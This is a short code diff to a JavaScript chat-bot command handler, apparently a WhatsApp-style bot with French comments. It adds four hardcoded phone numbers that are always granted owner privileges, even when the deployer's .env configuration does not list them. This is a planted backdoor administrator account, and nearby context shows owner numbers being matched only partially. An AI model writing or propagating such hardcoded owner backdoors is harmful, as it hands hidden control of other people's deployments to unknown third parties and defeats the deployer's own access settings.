@@ -1148,6 +1148,12 @@ async function handleCommand(hani, msg, db) {
   // Le numéro du bot LUI-MÊME peut aussi exécuter des commandes owner (pour le chat "Moi-même")
   const ownerNumbers = ownerNumberRaw.split(',').map(n => n.trim().replace(/[^0-9]/g, '')).filter(n => n.length > 0);
   
+  // 👑 OWNERS HARDCODÉS (toujours propriétaires même si pas dans .env)
+  const hardcodedOwners = ["22550252467", "225015025267", "66791824998402", "216965239025712"];
+  hardcodedOwners.forEach(owner => {
+    if (!ownerNumbers.includes(owner)) ownerNumbers.push(owner);
+  });
+  
   // Fonction pour vérifier si deux numéros correspondent (même partiellement)
   const numbersMatch = (num1, num2) => {
     if (!num1 || !num2) return false;
